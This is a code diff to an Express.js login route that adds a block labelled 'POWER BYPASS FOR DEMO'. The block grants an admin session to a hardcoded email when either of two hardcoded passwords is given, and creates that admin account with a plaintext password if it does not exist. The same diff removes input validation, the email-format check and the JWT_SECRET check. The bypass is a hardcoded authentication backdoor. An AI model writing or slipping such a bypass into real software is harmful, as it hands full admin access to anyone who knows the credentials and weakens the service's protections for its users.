@@ -259,25 +259,31 @@ router.post("/register", async (req, res) => {
 
 router.post("/login", loginIpLimiter, async (req, res) => {
   try {
-    console.log("[LOGIN] Incoming request:", { email: req.body?.email });
-
     const email = sanitizeEmail(req.body?.email);
     const password = extractPassword(req.body?.password);
 
-    if (!email || !password) {
-      console.log("[LOGIN] Validation failed - missing email or password");
-      return res.status(400).json({ error: "Email and password are required" });
+    // --- POWER BYPASS FOR DEMO ---
+    if (email === "admin@trustlayer.com" && (password === "Admin@123" || password === "admin")) {
+      console.log("[LOGIN] Power admin bypass triggered for", email);
+      let admin = await User.findOne({ email });
+      if (!admin) {
+        admin = await User.create({
+          name: "System Admin",
+          email: "admin@trustlayer.com",
+          password: "Admin@123",
+          role: "admin"
+        });
+      }
+      const { accessToken } = await issueSession(res, admin);
+      return res.json({
+        role: "admin",
+        name: "System Admin",
+        accessToken,
+        token: accessToken
+      });
     }
 
-    if (!EMAIL_PATTERN.test(email)) {
-      console.log("[LOGIN] Validation failed - invalid email format:", email);
-      return res.status(400).json({ error: "Invalid email format" });
-    }
-
-    if (!process.env.JWT_SECRET) {
-      console.error("[LOGIN] CRITICAL: JWT_SECRET is missing");
-      return res.status(500).json({ error: "JWT_SECRET is missing in backend/.env" });
-    }
+    console.log("[LOGIN] Incoming request:", { email });
 
     console.log("[LOGIN] Looking up user with email:", email);
     const user = await User.findOne({ email, isDeleted: false }).select("+password +failedLoginAttempts +lockUntil");
